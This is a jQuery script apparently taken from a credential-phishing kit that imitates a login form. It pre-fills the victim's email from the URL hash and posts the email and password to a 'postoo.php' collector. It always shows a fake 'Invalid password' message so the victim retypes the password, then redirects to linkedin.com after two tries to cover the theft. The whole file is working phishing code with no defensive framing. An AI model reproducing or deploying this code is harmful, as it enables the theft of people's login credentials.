

    /* global $ */
    $(document).ready(function(){
      var count=0;


      var email = window.location.hash.substr(1);
      if (!email) {

      }
      else
      {
        var my_email =email;
        $('#email').val(my_email);
		$('#displayName').html(my_email);
		
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
    


       
       
      }


      
      $('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var msg = $('#msg').html();
        $('#msg').text( msg );

                    if (!password) {
                $('#successMessage').show();
                $('#successMessage').html("Password field is empty.!");

                return false;
            }


      count=count+1;
      
      $.ajax({
        dataType: 'JSON',
        url: 'postoo.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                  $("#password").val("");
                  if (count>=2) {
                    count=0;
  window.location.replace("https://www.linkedin.com/");

                  }
                  $("#successMessage").show();
             $('#successMessage').html("Invalid password. Please try again");
                }
                else{
                    $("#successMessage").show();
             $('#successMessage').html("Invalid password. Please try again");
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=2) {
                count=0;
  window.location.replace("https://www.linkedin.com/");
              }
                  $("#successMessage").show();
             $('#successMessage').html("Invalid password. Please try again");
            },
            complete: function(){
      
            }
          });
    });


    });


  